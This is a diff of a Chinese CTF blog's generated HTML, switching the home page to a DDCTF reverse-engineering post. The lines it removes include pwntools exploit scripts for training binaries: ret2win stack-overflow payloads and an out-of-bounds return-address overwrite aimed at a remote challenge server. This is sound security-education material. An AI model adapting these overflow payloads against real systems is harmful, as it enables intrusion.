@@ -81,13 +81,31 @@
 
 
 
-<meta property="og:type" content="website">
+<meta name="description" content="title:DDCTF的两道简单逆向re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA，  逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了，  虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我">
+<meta property="og:type" content="article">
 <meta property="og:title" content="n0va">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/04/18/DDCTF之re/index.html">
 <meta property="og:site_name" content="n0va">
+<meta property="og:description" content="title:DDCTF的两道简单逆向re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA，  逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了，  虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/5.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/6.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/7.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/8.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/9.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/10.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/11.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/12.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/13.jpg">
+<meta property="og:image" content="http://yoursite.com/images/DDCTF/14.jpg">
+<meta property="og:updated_time" content="2019-04-18T10:40:36.489Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="n0va">
+<meta name="twitter:description" content="title:DDCTF的两道简单逆向re132位PE文件，加了upx壳，先脱壳，随便一个工具就可以 脱完壳扔IDA，  逻辑其实很简单就是输入一串字符串，经过sub_401000这个函数处理之后，结果跟”DDCTF{reverseME}”进行比较 那么主要就是分析这个函数了，  虽然看起来干干净净，但是会发现有几个地方，v1定义了之后 直接用了，并没有任何的赋值，静态是看不出个所以然来的，所以我">
+<meta name="twitter:image" content="http://yoursite.com/images/DDCTF/1.jpg">
 
 
 
@@ -117,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/04/18/DDCTF之re/">
 
 
 
 
 
-  <title>n0va</title>
+  <title> | n0va</title>
   
 
 
@@ -142,8 +160,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -278,9 +295,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -310,9 +327,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/18/DDCTF之re/" itemprop="url">未命名</a></h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -362,9 +377,7 @@
       
 
       
-        
-          
-            <hr>
+        <hr>
 <h2 id="title-DDCTF的两道简单逆向"><a href="#title-DDCTF的两道简单逆向" class="headerlink" title="title:DDCTF的两道简单逆向"></a>title:DDCTF的两道简单逆向</h2><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>32位PE文件，加了upx壳，先脱壳，随便一个工具就可以</p>
 <p>脱完壳扔IDA，</p>
 <p><img src="\images\DDCTF\1.jpg" alt></p>
@@ -401,8 +414,6 @@
 <p><img src="\images\DDCTF\14.jpg" alt></p>
 <p>转成大写字母就是flag了</p>
 
-          
-        
       
     </div>
     
@@ -419,142 +430,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/04/2019安恒杯1月月赛/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/04/2019安恒杯1月月赛/" itemprop="url">2019安恒杯1月月赛</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-04T16:36:40+08:00">
-                2019-04-04
-              </time>
+              <a href="/2019/04/04/2019安恒杯1月月赛/" rel="next" title="2019安恒杯1月月赛">
+                <i class="fa fa-chevron-left"></i> 2019安恒杯1月月赛
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <h2 id="python-crackme"><a href="#python-crackme" class="headerlink" title="python_crackme"></a>python_crackme</h2><p>（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载<a href="https://sourceforge.net/projects/pyinstallerextractor/" target="_blank" rel="noopener">地址</a>）反编译exe文件</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-5f176ccfca1b21e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>得到一个文件夹里面有一大堆东西</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-59a423ea37b08a40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>用010editor打开与exe文件同名的二进制文件</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-5256dca2bf529b4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/04/2019安恒杯1月月赛/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -564,397 +461,11 @@
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/04/pwn入门之ROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/04/pwn入门之ROP/" itemprop="url">pwn入门之ROP</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-04T16:30:44+08:00">
-                2019-04-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p><a href="https://ropemporium.com/" target="_blank" rel="noopener">ROP Emporium</a><br><img src="https://upload-images.jianshu.io/upload_images/12343640-e5fa6242a5dc0077.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>放到IDA很容易就找到溢出点<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h] </span></span><br><span class="line">可以看出s距ebp的偏移量为<span class="number">0x28</span></span><br><span class="line">所以我们写入<span class="number">0x28</span>正好可以写到ebp之前，要覆盖ebp还需要再写入<span class="number">4</span>个字节（<span class="number">32</span>位）</span><br></pre></td></tr></table></figure></p>
-<p>有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-87d74ee929c3cf04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>exp 如下 ：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">ret2win32 = <span class="number">0x08048659</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span> + p32(<span class="number">0</span>) + p32(ret2win32)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
-<hr>
-<p>64位的溢出点也一样<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2win'</span>)</span><br><span class="line">ret2win = <span class="number">0x400811</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(ret2win)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/04/pwn入门之ROP/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/04/Hitcon-Training/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/04/Hitcon-Training/" itemprop="url">Hitcon-Training lab1~lab9</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-04T16:23:04+08:00">
-                2019-04-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span></span><br><span class="line">cipher = [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	flag += chr(cipher[i]^ord(key[i]))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
-<p>方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方</span><br><span class="line">► 0x80486e7 &lt;get_flag+332&gt;    lea    eax, [ebp - 0x80]</span><br><span class="line">  0x80486ea &lt;get_flag+335&gt;    push   eax</span><br><span class="line">  0x80486eb &lt;get_flag+336&gt;    push   dword ptr [ebp - 0x74]</span><br><span class="line">  0x80486ee &lt;get_flag+339&gt;    call   read@plt &lt;0x8048410&gt;</span><br><span class="line">再运行到0x8048712处，可以查看 ebp - 0x80的值 </span><br><span class="line">pwndbg&gt; x/wx ($ebp -0x80)</span><br><span class="line">0xffffcd08:	0x4f77e43c</span><br><span class="line">转成十进制，输入就能得到flag</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">1333257276  </span><br><span class="line">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally]</span><br></pre></td></tr></table></figure></p>
-<p>方法3：<br>同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-e809aec7c4485e87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12343640-9c69b4d18ca86e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/04/Hitcon-Training/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/28/hackme.inndy之pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="n0va">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/n0va.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="n0va">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/28/hackme.inndy之pwn/" itemprop="url">hackme.inndy之pwn</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-28T21:59:21+08:00">
-                2019-03-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="catflag"><a href="#catflag" class="headerlink" title="catflag"></a>catflag</h2><p>nc 连接直接get shell </p>
-<h2 id="homeosrk"><a href="#homeosrk" class="headerlink" title="homeosrk"></a>homeosrk</h2><p>数组下标溢出，绕过canary保护直接修改ret地址为后门函数<code>call_me_mabe</code></p>
-<p><img src="\images\piture\1.png" alt></p>
-<p>这里可以算出arr[14]为ret位置</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process('./homework')</span></span><br><span class="line">p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7701</span>)</span><br><span class="line">call_me = <span class="number">0x80485FB</span></span><br><span class="line"><span class="keyword">print</span> str(call_me)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">'What\'s your name? '</span>)</span><br><span class="line">p.sendline(<span class="string">'n0va'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'4 &gt; dump all numbers\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">' &gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index to edit: '</span>)</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'How many? '</span>)</span><br><span class="line">p.sendline(str(call_me))</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/03/28/hackme.inndy之pwn/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -962,6 +473,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -982,8 +497,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1034,6 +558,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-DDCTF的两道简单逆向"><span class="nav-number">1.</span> <span class="nav-text">title:DDCTF的两道简单逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re1"><span class="nav-number">2.</span> <span class="nav-text">re1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re2"><span class="nav-number">3.</span> <span class="nav-text">re2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#汇编直接逆"><span class="nav-number">3.1.</span> <span class="nav-text">汇编直接逆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64"><span class="nav-number">3.2.</span> <span class="nav-text">base64</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1183,6 +723,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
